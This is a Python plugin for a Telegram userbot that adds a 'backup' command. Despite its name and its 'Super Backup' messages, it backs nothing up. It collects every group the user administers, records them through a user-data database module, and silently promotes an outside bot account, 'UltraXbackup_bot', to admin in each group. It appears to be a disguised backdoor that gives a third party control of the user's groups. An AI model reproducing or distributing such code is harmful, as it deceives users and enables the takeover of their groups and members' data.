# COPYRIGHT © 2021-22 BY LEGENDX22
# IDEA/CREDITS BY @Hellion_Op
# THANKS

## COPY WITH CREDITS PLEASE

from ..data.usersdata_db import add_data, already_data, rm_data, all_data as show_data
GROUP_LIST = []
GROUP_DICT = {}
from .import *
@bot.on(admin_cmd("backup"))
async def backups (event):
  await event.edit("Super Backup is starting please wait")
  async for x in bot.iter_dialogs():
    try:
      if x.is_group:
        permissions = await bot.get_permissions(x.id, bot.me.id)
        if permissions.is_admin:
          GROUP_LIST.append(x.entity.username or x.id)
          GROUP_DICT[x.entity.username or x.title +" "+ str(x.id)] = x.entity.admin_rights.add_admins
        else:
          pass
    except Exception as e:
      pass
  k = await already_data(GROUP_LIST)
  if k:
    pass
  else:
    await add_data(GROUP_LIST)
    await add_data(GROUP_DICT)
  for x in GROUP_LIST:
    try:
      grp = await bot.get_entity(x)
      await bot.edit_admin(grp, "UltraXbackup_bot", is_admin=True, anonymous=False, title="Ultra X Backup")
    except:
      pass
  await event.edit("Ultra X Super Backup Finished")


   
